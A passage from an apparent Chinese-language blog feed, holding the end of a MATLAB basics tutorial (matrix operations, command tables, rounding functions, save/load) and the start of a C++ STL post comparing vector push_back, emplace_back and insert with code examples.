class="hljs-number">20</span><br><br>&gt;&gt; A([<span class="hljs-number">1</span>,<span class="hljs-number">4</span>],<span class="hljs-number">3</span>:<span class="hljs-keyword">end</span>) <span class="hljs-comment">% 第1行到第4行内，且从第3列开始到最后一列。</span><br><span class="hljs-built_in">ans</span> =<br><span class="hljs-number">3</span><span class="hljs-number">4</span><span class="hljs-number">5</span><br><span class="hljs-number">18</span><span class="hljs-number">19</span><span class="hljs-number">20</span><br><br></code></pre></div></td></tr></table></figure><h3 id="1-10-删除矩阵元素"><a href="#1-10-删除矩阵元素" class="headerlink" title="1.10 删除矩阵元素"></a>1.10 删除矩阵元素</h3><p>利用空矩阵删除矩阵的元素。空矩阵是指没有任何元素的矩阵。如：<code>x=[]</code>。</p><h3 id="1-11-改变矩阵的行、列数"><a href="#1-11-改变矩阵的行、列数" class="headerlink" title="1.11 改变矩阵的行、列数"></a>1.11 改变矩阵的行、列数</h3><p><code>reshape(A,m,n)</code>：在矩阵总元素保持不变的前提下，将矩阵A重新排成<code>m*n</code>的二维矩阵。但它只是改变原矩阵的行数和列数，但并不改变原矩阵元素个数及其存储顺序。</p><p><code>A(:)</code>：将矩阵A的每一列元素堆叠起来，成为一个列向量。<code>A(:)</code>等价于<code>reshape(A,6,1)</code>。</p><h2 id="2-MATLAB-命令"><a href="#2-MATLAB-命令" class="headerlink" title="2.MATLAB 命令"></a>2.MATLAB 命令</h2><h3 id="2-1-管理会话的命令（命令行窗口）"><a href="#2-1-管理会话的命令（命令行窗口）" class="headerlink" title="2.1 管理会话的命令（命令行窗口）"></a>2.1 管理会话的命令（命令行窗口）</h3><table><thead><tr><th align="center">命令</th><th align="center">目的/作用</th></tr></thead><tbody><tr><td align="center"><code>clc</code></td><td align="center">清除命令窗口。</td></tr><tr><td align="center"><code>clear</code></td><td align="center">从内存中删除变量。</td></tr><tr><td align="center"><code>exist</code></td><td align="center">检查存在的文件或变量。</td></tr><tr><td align="center"><code>global</code></td><td align="center">声明变量为全局。</td></tr><tr><td align="center"><code>help</code></td><td align="center">搜索帮助主题。</td></tr><tr><td align="center"><code>lookfor</code></td><td align="center">搜索帮助关键字条目。</td></tr><tr><td align="center"><code>quit</code></td><td align="center">停止MATLAB。</td></tr><tr><td align="center"><code>who</code></td><td align="center">列出当前变量。</td></tr><tr><td align="center"><code>whos</code></td><td align="center">列出当前变量（长显示）。</td></tr></tbody></table><h3 id="2-2-系统命令"><a href="#2-2-系统命令" class="headerlink" title="2.2 系统命令"></a>2.2 系统命令</h3><p>使用MATLAB的时候有一些系统命令可以方便操作，如在当前的工作区中可以使用系统命令保存为一个文件、加载文件、显示日期、列出目录中的文件和显示当前目录等。</p><table><thead><tr><th align="center">命令</th><th align="center">目的/作用</th></tr></thead><tbody><tr><td align="center"><code>cd</code></td><td align="center">改变当前目录。</td></tr><tr><td align="center"><code>date</code></td><td align="center">显示当前日期。</td></tr><tr><td align="center"><code>delete</code></td><td align="center">删除一个文件。</td></tr><tr><td align="center"><code>diary</code></td><td align="center">日记文件记录开/关切换。</td></tr><tr><td align="center"><code>dir</code></td><td align="center">列出当前目录中的所有文件。</td></tr><tr><td align="center"><code>load</code></td><td align="center">负载工作区从一个文件中的变量。</td></tr><tr><td align="center"><code>path</code></td><td align="center">显示搜索路径。</td></tr><tr><td align="center"><code>pwd</code></td><td align="center">显示当前目录。</td></tr><tr><td align="center"><code>save</code></td><td align="center">保存在一个文件中的工作区变量。</td></tr><tr><td align="center"><code>type</code></td><td align="center">显示一个文件的内容。</td></tr><tr><td align="center"><code>what</code></td><td align="center">列出所有MATLAB文件在当前目录中。</td></tr><tr><td align="center"><code>wklread</code></td><td align="center">读取.wk1电子表格文件。</td></tr></tbody></table><h3 id="2-3-输入和输出命令"><a href="#2-3-输入和输出命令" class="headerlink" title="2.3 输入和输出命令"></a>2.3 输入和输出命令</h3><table><thead><tr><th align="center">命令</th><th align="center">作用/目的</th></tr></thead><tbody><tr><td align="center"><code>disp</code></td><td align="center">显示一个数组或字符串的内容。</td></tr><tr><td align="center"><code>fscanf</code></td><td align="center">阅读从文件格式的数据。</td></tr><tr><td align="center"><code>format</code></td><td align="center">控制屏幕显示的格式。</td></tr><tr><td align="center"><code>fprintf</code></td><td align="center">执行格式化写入到屏幕或文件。</td></tr><tr><td align="center"><code>input</code></td><td align="center">显示提示并等待输入。</td></tr><tr><td align="center"><code>;</code></td><td align="center">禁止显示网版印刷</td></tr></tbody></table><p>其中，fscanf 和 fprintf 命令的行为像 C 的 scanf 和 printf 函数。支持格式：</p><table><thead><tr><th align="center">格式代码</th><th align="center">目的/作用</th></tr></thead><tbody><tr><td align="center"><code>%s</code></td><td align="center">输出字符串</td></tr><tr><td align="center"><code>%d</code></td><td align="center">输出整数</td></tr><tr><td align="center"><code>%f</code></td><td align="center">输出浮点数</td></tr><tr><td align="center"><code>%e</code></td><td align="center">显示科学计数法形式</td></tr><tr><td align="center"><code>%g</code></td><td align="center">%f 和%e 的结合，根据数据选择适当的显示方式</td></tr></tbody></table><p>用于数字显示格式的函数：</p><table><thead><tr><th align="center">Format函数</th><th align="center">最多可显示</th></tr></thead><tbody><tr><td align="center"><code>format short</code></td><td align="center">四位十进制数（默认）</td></tr><tr><td align="center"><code>format long</code></td><td align="center">15位定点表示</td></tr><tr><td align="center"><code>format short e</code></td><td align="center">五位浮点表示</td></tr><tr><td align="center"><code>format long e</code></td><td align="center">15位浮点表示</td></tr><tr><td align="center"><code>format bank</code></td><td align="center">两个十进制数字</td></tr><tr><td align="center"><code>format +</code></td><td align="center">正，负或零</td></tr><tr><td align="center"><code>format rat</code></td><td align="center">有理数近似</td></tr><tr><td align="center"><code>format compact</code></td><td align="center">变量之间没有空行</td></tr><tr><td align="center"><code>format loose</code></td><td align="center">变量之间有空行</td></tr></tbody></table><h3 id="2-4-向量、矩阵和阵列命令"><a href="#2-4-向量、矩阵和阵列命令" class="headerlink" title="2.4 向量、矩阵和阵列命令"></a>2.4 向量、矩阵和阵列命令</h3><p>MATLAB用于工作数组、矩阵和向量的各种命令。</p><table><thead><tr><th align="center">命令</th><th align="center">作用/目的</th></tr></thead><tbody><tr><td align="center"><code>cat</code></td><td align="center">连接数组</td></tr><tr><td align="center"><code>find</code></td><td align="center">查找非零元素的索引</td></tr><tr><td align="center"><code>length</code></td><td align="center">计算元素数量</td></tr><tr><td align="center"><code>linspace</code></td><td align="center">创建间隔向量</td></tr><tr><td align="center"><code>logspace</code></td><td align="center">创建对数间隔向量</td></tr><tr><td align="center"><code>max</code></td><td align="center">返回最大元素</td></tr><tr><td align="center"><code>min</code></td><td align="center">返回最小元素</td></tr><tr><td align="center"><code>prod</code></td><td align="center">计算数组元素的连乘积</td></tr><tr><td align="center"><code>reshape</code></td><td align="center">重新调整矩阵的行数、列数、维数</td></tr><tr><td align="center"><code>size</code></td><td align="center">计算数组大小</td></tr><tr><td align="center"><code>sort</code></td><td align="center">排序每个列</td></tr><tr><td align="center"><code>sum</code></td><td align="center">每列相加</td></tr><tr><td align="center"><code>eye</code></td><td align="center">创建一个单位矩阵</td></tr><tr><td align="center"><code>ones</code></td><td align="center">生成全1矩阵</td></tr><tr><td align="center"><code>zeros</code></td><td align="center">生成零矩阵</td></tr><tr><td align="center"><code>cross</code></td><td align="center">计算矩阵交叉乘积</td></tr><tr><td align="center"><code>dot</code></td><td align="center">计算矩阵点积</td></tr><tr><td align="center"><code>det</code></td><td align="center">计算数组的行列式</td></tr><tr><td align="center"><code>inv</code></td><td align="center">计算矩阵的逆</td></tr><tr><td align="center"><code>pinv</code></td><td align="center">计算矩阵的伪逆</td></tr><tr><td align="center"><code>rank</code></td><td align="center">计算矩阵的秩</td></tr><tr><td align="center"><code>rref</code></td><td align="center">将矩阵化成行最简形</td></tr><tr><td align="center"><code>cell</code></td><td align="center">创建单元数组</td></tr><tr><td align="center"><code>celldisp</code></td><td align="center">显示单元数组</td></tr><tr><td align="center"><code>cellplot</code></td><td align="center">显示单元数组的图形表示</td></tr><tr><td align="center"><code>num2cell</code></td><td align="center">将数值阵列转化为异质阵列</td></tr><tr><td align="center"><code>deal</code></td><td align="center">匹配输入和输出列表</td></tr><tr><td align="center"><code>iscell</code></td><td align="center">判断是否为元胞类型</td></tr></tbody></table><h3 id="2-5-绘图命令"><a href="#2-5-绘图命令" class="headerlink" title="2.5 绘图命令"></a>2.5 绘图命令</h3><table><thead><tr><th align="center">命令</th><th align="center">作用/目的</th></tr></thead><tbody><tr><td align="center"><code>axis</code></td><td align="center">人工选择坐标轴尺寸</td></tr><tr><td align="center"><code>fplot</code></td><td align="center">智能绘图功能</td></tr><tr><td align="center"><code>grid</code></td><td align="center">显示网格线</td></tr><tr><td align="center"><code>plot</code></td><td align="center">生成XY图</td></tr><tr><td align="center"><code>print</code></td><td align="center">打印或绘图到文件</td></tr><tr><td align="center"><code>title</code></td><td align="center">把文字置于顶部</td></tr><tr><td align="center"><code>xlabel</code></td><td align="center">将文本标签添加到x轴</td></tr><tr><td align="center"><code>ylabel</code></td><td align="center">将文本标签添加到y轴</td></tr><tr><td align="center"><code>axes</code></td><td align="center">创建轴对象</td></tr><tr><td align="center"><code>close</code></td><td align="center">关闭当前的绘图</td></tr><tr><td align="center"><code>close all</code></td><td align="center">关闭所有绘图</td></tr><tr><td align="center"><code>figure</code></td><td align="center">打开一个新的图形窗口</td></tr><tr><td align="center"><code>gtext</code></td><td align="center">通过鼠标在指定位置放注文</td></tr><tr><td align="center"><code>hold</code></td><td align="center">保持当前图形</td></tr><tr><td align="center"><code>legend</code></td><td align="center">鼠标放置图例</td></tr><tr><td align="center"><code>refresh</code></td><td align="center">重新绘制当前图形窗口</td></tr><tr><td align="center"><code>set</code></td><td align="center">指定对象的属性，如轴</td></tr><tr><td align="center"><code>subplot</code></td><td align="center">在子窗口中创建图</td></tr><tr><td align="center"><code>text</code></td><td align="center">在图上做标记</td></tr><tr><td align="center"><code>bar</code></td><td align="center">创建条形图</td></tr><tr><td align="center"><code>loglog</code></td><td align="center">创建双对数图</td></tr><tr><td align="center"><code>polar</code></td><td align="center">创建极坐标图像</td></tr><tr><td align="center"><code>semilogx</code></td><td align="center">创建半对数图（对数横坐标）</td></tr><tr><td align="center"><code>semilogy</code></td><td align="center">创建半对数图（对数纵坐标）</td></tr><tr><td align="center"><code>stairs</code></td><td align="center">创建阶梯图</td></tr><tr><td align="center"><code>stem</code></td><td align="center">创建针状图</td></tr></tbody></table><h3 id="2-6-续行符"><a href="#2-6-续行符" class="headerlink" title="2.6 续行符"></a>2.6 续行符</h3><p>当一行不能写下时，可以使用续行符在下一行继续写。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">s=<span class="hljs-number">1</span>/<span class="hljs-number">2</span>+<span class="hljs-number">2</span>/<span class="hljs-number">3</span>+...<br><span class="hljs-number">3</span>/<span class="hljs-number">4</span>+<span class="hljs-number">4</span>/<span class="hljs-number">5</span>+<span class="hljs-number">5</span>/<span class="hljs-number">6</span>+...<br><span class="hljs-number">6</span>/<span class="hljs-number">7</span>+<span class="hljs-number">7</span>/<span class="hljs-number">8</span><br></code></pre></div></td></tr></table></figure><h3 id="2-7-设置当前文件夹"><a href="#2-7-设置当前文件夹" class="headerlink" title="2.7 设置当前文件夹"></a>2.7 设置当前文件夹</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">cd f:\matlabtest<br>cd f:\matlabtest\shi<br></code></pre></div></td></tr></table></figure><p><strong>注意：必须要先建好文件夹后，才能切换到此文件夹下。</strong></p><h2 id="3-数学函数"><a href="#3-数学函数" class="headerlink" title="3.数学函数"></a>3.数学函数</h2><table><thead><tr><th align="center">函数名</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>rem(m,n)</code></td><td align="center">取余</td></tr><tr><td align="center"><code>fix(123/100)</code></td><td align="center">取整</td></tr><tr><td align="center"><code>isprime(n)</code></td><td align="center">判断是否为素数</td></tr><tr><td align="center"><code>linspace(n,m,g)</code></td><td align="center">创建g个数，其中n表示开始的数，m表示结束的数</td></tr></tbody></table><h3 id="3-1-函数的调用"><a href="#3-1-函数的调用" class="headerlink" title="3.1 函数的调用"></a>3.1 函数的调用</h3><p><code>函数名(函数自变量的值)</code><br>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">a=[<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]<br>b=<span class="hljs-built_in">exp</span>(a)<br></code></pre></div></td></tr></table></figure><h3 id="3-2-函数的应用"><a href="#3-2-函数的应用" class="headerlink" title="3.2 函数的应用"></a>3.2 函数的应用</h3><blockquote><ol><li>三角函数有以弧度为单位的函数和以角度为单位的函数，如果是以角度为单位的函数，就在函数名后面加上 <code>d</code>，以示区别。</li></ol></blockquote><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; shi(<span class="hljs-built_in">pi</span>/<span class="hljs-number">2</span>)<br><span class="hljs-built_in">ans</span> =<br><span class="hljs-number">1</span><br><br>&gt;&gt; <span class="hljs-built_in">sind</span>(<span class="hljs-number">90</span>)<br><span class="hljs-built_in">ans</span> = <br><span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li><code>abs</code> 函数可以求实数的绝对值、复数的模、字符串的 ASCII 码值。</li></ol></blockquote><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; <span class="hljs-built_in">abs</span>(<span class="hljs-number">-4</span>)<br><span class="hljs-built_in">ans</span> =<span class="hljs-number">4</span> <br><span class="hljs-number">4</span><br><br>&gt;&gt; <span class="hljs-built_in">abs</span>(<span class="hljs-number">3</span>+<span class="hljs-number">4</span><span class="hljs-built_in">i</span>)<br><span class="hljs-built_in">ans</span> = <br><span class="hljs-number">5</span><br><br>&gt;&gt;<span class="hljs-built_in">abs</span>(<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-built_in">ans</span> = <br><span class="hljs-number">97</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>用去取整的函数：<code>fix</code>、<code>floor</code>、<code>ceil</code>、<code>round</code>。</li></ol></blockquote><ul><li><code>round</code>：按照四舍五入的规则取整。</li><li><code>ceil</code>：向上取整，取大于等于这个数的第一个整数。</li><li><code>floor</code>：向下取整，取小于等于这个数的第一个整数。</li><li><code>fix</code>：固定取靠近 0 的那个整数，即舍去小数部分。</li></ul><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; <span class="hljs-built_in">round</span>(<span class="hljs-number">4.7</span>)<br><span class="hljs-built_in">ans</span> = <br><span class="hljs-number">5</span><br><br>&gt;&gt; <span class="hljs-built_in">floor</span>(<span class="hljs-number">3.6</span>)<br><span class="hljs-built_in">ans</span> = <br><span class="hljs-number">3</span><br><br>&gt;&gt; <span class="hljs-built_in">ceil</span>(<span class="hljs-number">-3.8</span>)<br><span class="hljs-built_in">ans</span> = <br><span class="hljs-number">-3</span><br><br>&gt;&gt; <span class="hljs-built_in">fix</span>(<span class="hljs-number">-3.2</span>)<br><span class="hljs-built_in">ans</span> = <br><span class="hljs-number">-3</span><br></code></pre></div></td></tr></table></figure><h2 id="4-变量管理"><a href="#4-变量管理" class="headerlink" title="4.变量管理"></a>4.变量管理</h2><h3 id="4-1-内存变量文件"><a href="#4-1-内存变量文件" class="headerlink" title="4.1 内存变量文件"></a>4.1 内存变量文件</h3><p><code>save</code>：创建内存变量文件。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">save mydata a x<br><span class="hljs-comment">% 将变量 a、x 装入 mydata 变量文件中。</span><br></code></pre></div></td></tr></table></figure><p><code>load</code>：装入内存变量文件。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">load mydata<br></code></pre></div></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM-C++STL部分函数及其用法</title>
    <link href="/2021/05/28/ACM/ACM-C++STL%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E7%94%A8%E6%B3%95/"/>
    <url>/2021/05/28/ACM/ACM-C++STL%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>记录STL提供的有关容器的函数及其用法。此片博客内容较多，篇幅较长。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><h3 id="一-vector-添加元素的两种函数"><a href="#一-vector-添加元素的两种函数" class="headerlink" title="一.vector 添加元素的两种函数"></a>一.vector 添加元素的两种函数</h3><h4 id="push-back-函数"><a href="#push-back-函数" class="headerlink" title="push_back()函数"></a>push_back()函数</h4><p>该成员函数的功能是在 vector 容器<span style="color:green"> 尾部 </span>添加一个元素，用法也非常简单。简单举例：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; values&#123;&#125;;<br>    values.push_back(<span class="hljs-number">1</span>);<br>    values.push_back(<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; values.size(); i++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; values[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><h4 id="emplace-back-函数"><a href="#emplace-back-函数" class="headerlink" title="emplace_back()函数"></a>emplace_back()函数</h4><p>该函数是 C++ 11 新增加的，其功能和 push_back() 相同，都是在 vector 容器的尾部添加一个元素。简单例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; values&#123;&#125;;<br>    values.emplace_back(<span class="hljs-number">1</span>);<br>    values.emplace_back(<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; values.size(); i++) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; values[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><p>以上 2 段代码，只是用 emplace_back() 替换了 push_back()，它们实现的功能是一样的。</p><blockquote><p>那么 C++ 11 标准中为什么要多此一举呢？<br>在于他们还是有一定的区别。</p></blockquote><h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><p>emplace_back() 和 push_back() 的区别，就在于底层实现的机制不同。push_back() 向容器尾部添加元素时，首先会创建这个元素，然后再将这个元素拷贝或者移动到容器中（如果是拷贝的话，事后会自行销毁先前创建的这个元素）；而 emplace_back() 在实现时，则是直接在容器尾部创建这个元素，省去了拷贝或移动元素的过程。</p><p>用例子了解它们之间的区别：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt; </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt; </span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">testDemo</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    testDemo(<span class="hljs-keyword">int</span> num):num(num)&#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;调用构造函数&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    testDemo(<span class="hljs-keyword">const</span> testDemo&amp; other) :num(other.num) &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;调用拷贝构造函数&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    testDemo(testDemo&amp;&amp; other) :num(other.num) &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;调用移动构造函数&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">int</span> num;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;emplace_back:&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;testDemo&gt; demo1;<br>    demo1.emplace_back(<span class="hljs-number">2</span>);  <br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;push_back:&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;testDemo&gt; demo2;<br>    demo2.push_back(<span class="hljs-number">2</span>);<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>emplace_back:<br>调用构造函数<br>push_back:<br>调用构造函数<br>调用移动构造函数<br><br><span class="hljs-comment">//若将 testDemo 类中的移动构造函数注释掉，再运行程序会发现，运行结果变为：</span><br>emplace_back:<br>调用构造函数<br>push_back:<br>调用构造函数<br>调用拷贝构造函数<br></code></pre></div></td></tr></table></figure><p>可以看出，push_back() 在底层实现时，会优先选择调用移动构造函数，如果没有才会调用拷贝构造函数。显然完成同样的操作，push_back() 的底层实现过程比 emplace_back() 更繁琐，换句话说，emplace_back() 的执行效率比 push_back() 高。因此，在实际使用时，建议还是优先选用 emplace_back()。</p><blockquote><p><strong>由于 emplace_back() 是 C++ 11 标准新增加的，如果程序要兼顾之前的版本，还是应该使用 push_back()。</strong></p></blockquote><hr><h3 id="二-vector-插入元素的两种函数"><a href="#二-vector-插入元素的两种函数" class="headerlink" title="二.vector 插入元素的两种函数"></a>二.vector 插入元素的两种函数</h3><p>vector容器提供了 insert() 和 emplace() 这 2 个成员函数，用来实现在容器指定位置处插入元素。</p><h4 id="insert-函数"><a href="#insert-函数" class="headerlink" title="insert()函数"></a>insert()函数</h4><p>insert() 函数的功能是在 vector 容器的指定位置插入一个或多个元素。该函数的语法格式有多种.</p><table><thead><tr><th>语法格式</th><th>用法说明</th></tr></thead><tbody><tr><td>iterator insert(pos,elem)</td><td>在迭代器 pos 指定的位置之前插入一个新元素elem，并返回表示新插入元素位置的迭代器。</td></tr><tr><td>iterator insert(pos,n,elem)</td><td>在迭代器 pos 指定的位置之前插入 n 个元素 elem，并返回表示第一个新插入元素位置的迭代器。</td></tr><tr><td>iterator insert(pos,first,last)</td><td>在迭代器 pos 指定的位置之前，插入其他容器（不仅限于vector）中位于 [first,last) 区域的所有元素，并返回表示第一个新插入元素位置的迭代器。</td></tr><tr><td>iterator insert(pos,initlist)</td><td>在迭代器 pos 指定的位置之前，插入初始化列表（用大括号{}括起来的多个元素，中间有逗号隔开）中所有的元素，并返回表示第一个新插入元素位置的迭代器。</td></tr></tbody></table><p>演示使用 insert() 函数向 vector 容器中插入元素：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt; </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt; </span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;array&gt; </span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span 